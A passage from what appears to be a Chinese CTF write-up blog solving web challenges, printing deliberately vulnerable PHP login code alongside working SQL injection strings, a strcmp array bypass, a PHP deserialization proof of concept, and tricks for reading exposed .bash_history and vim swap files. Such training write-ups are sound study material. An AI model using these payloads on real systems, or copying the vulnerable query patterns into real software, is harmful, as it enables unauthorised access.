class="line">Secure Web Login</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;<span class="comment">//只看这一条sql语句就行了</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;input type=password name=pass value=<span class="string">"Password"</span>&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">"index.phps"</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>问题的关键点是注入，直接<code>admin&#39;) or 1=1#</code>就可以了，登录得flag…</li></ul><p><br><br><br></p><h1 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h1><ul><li>分析源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];<span class="comment">//POST赋值</span></span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))<span class="comment">//检查</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;<span class="comment">//比较</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>当不同类型的变量进行比较的时候就会存在变量转换的问题，在转换之后就有可能会存在问题。</p></li><li><p>直接传入 <code>pass[]=1</code>,得flag…</p></li></ul><p><br><br><br></p><h1 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h1><ul><li>分析源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);<span class="comment">//ord()求一个字符对应的ascii码 </span></span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)<span class="comment">//循环</span></span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )<span class="comment">//判断，这个变量不能为数字</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;<span class="comment">//这里满足这个条件才能输出flag</span></span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>题目中需要传入的变量不能是数字，但要和 54975581388 相等才能输出flag,故通过16进制编码（当字符串开头是0x时，PHP会将字符串转换成十进制再进行比较）。 将 54975581388 转换成16进制 ——》 </li></ul><p><br><br><br></p><h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><ul><li><p>登录进去你会发现 “你的账号” 那一框元素不能修改，且url后面为 “?user1=Y3RmdXNlcg%3D%3D”.</p></li><li><p>直接Burp Suite 抓包，发现此题对三处 admin 加以加密，所以我们要改三处地方。如下：</p></li></ul><p><img src="/.com//1.png" alt></p><ul><li><p>且需对 <code>admin</code> 先进行 base64加密后经过URL编码。</p></li><li><p>go，得flag…</p></li></ul><p><br><br><br></p><h1 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h1><ul><li>分析代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;<span class="comment">//判断</span></span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];<span class="comment">//GET传参赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);<span class="comment">//除掉gpc添加的反斜杠</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);<span class="comment">//unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 然后赋值给变量o</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>构造POC <a href="https://www.jianshu.com/p/19999fa5ca8b" target="_blank" rel="noopener">转一个详细过程</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;enter=&amp;<span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> just4fun());</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>得flag…</li></ul><p><br><br><br></p><h1 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h1><ul><li>分析代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;<span class="comment">//自定义一个清除开了gpc后加的反斜杠的函数</span></span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);<span class="comment">//调用函数</span></span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);<span class="comment">//调用函数</span></span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>由于使用了htmlentities()函数，所以无法使用分号了。此时就可以使用反斜杠来通过转义的方式来吞掉一个分号。</p></li><li><p>构造url <code>?username=admin\&amp;password= or 1%23</code> 查询语句变为 ——》 <code>SELECT * FROM users WHERE name=&#39;admin\&#39;AND pass=&#39; or 1#&#39;</code></p></li><li><p>得到flag…</p></li></ul><p><br><br><br></p><h1 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h1><ul><li><p>点进网页发现一堆文字，类似bugku一道 “jsfuck” 的题，直接丢进控制台，出现一堆文字 “1bc29b36f623ba82aaf6724fd3b16718.php”</p></li><li><p>猜测是某个网页，访问 ——》 网页出现文字 “哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里”</p></li><li><p>Burp Suite 抓包发现header里面有 “history of bash”</p><ul><li><code>Bash shell</code>在<code>~/.bash_history</code>（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</li></ul></li><li><p>URL访问 .bash_history ——》 出现 “zip -r flagbak.zip ./*”</p></li><li><p>访问这个zip文件，自动下载，解压得flag…</p></li></ul><p><br><br><br></p><h1 id="system"><a href="#system" class="headerlink" title="system"></a>system</h1><p>这题挂了…</p><p><br><br><br></p><h1 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h1><ul><li>分析代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line">$query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line"><span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;<span class="comment">//如果变量存在，并且，$pass与$query[pw]相等,输出flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>观察发现只要让结果集中有你输入密码的MD5值就行，直接构造 user处为： <code>admin&#39; and 1=2 union select md5(1)#</code> password 为 <code>1</code></p></li><li><p>提交得flag…</p></li></ul><p><br><br><br></p><h1 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h1><ul><li>网上的WP很详细，云通关一波…（还不会写脚本啦<del>~</del>）</li></ul><p><br><br><br></p><h1 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h1><ul><li><p>查看网页源代码，知道用户名是 <a href="mailto:admin@nuptzj.cn" target="_blank" rel="noopener">admin@nuptzj.cn</a></p></li><li><p>类似hgame week1的一道题，linux下一般使用vi编辑器，并且异常退出会留下备份文件</p></li><li><p>经过测试发现存在<code>.submit.php.swp</code>文件</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">........这一行是省略的代码........ <span class="comment">/* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */</span> ........这一行是省略的代码........ </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress)) &#123; </span><br><span class="line">    <span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'fail'</span>); </span><br><span class="line">    <span class="keyword">if</span>($token!=<span class="string">'0'</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'fail'</span>); </span><br><span class="line">        $sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>; </span><br><span class="line">        $r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>); </span><br><span class="line">        $r = mysql_fetch_assoc($r); </span><br><span class="line">        $r = $r[<span class="string">'num'</span>]; </span><br><span class="line">        <span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123; <span class="keyword">echo</span> $flag; &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">"失败了呀"</span>; &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>直接输出十个0，得到flag…</li></ul><p><br><br><br></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>《文件包含》一题中涉及到了：<ul><li><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势 </a></li><li><a href="https://www.freebuf.com/column/183226.html" target="_blank" rel="noopener">ctf中关于php伪协议的考查 </a></li></ul></li></ul><ul><li>《Header》一题中涉及到了：<ul><li><a href="http://www.cnblogs.com/ranyonsue/p/5984001.html" target="_blank" rel="noopener">关于HTTP协议，一篇就够了</a></li></ul></li></ul><p><br><br><br></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
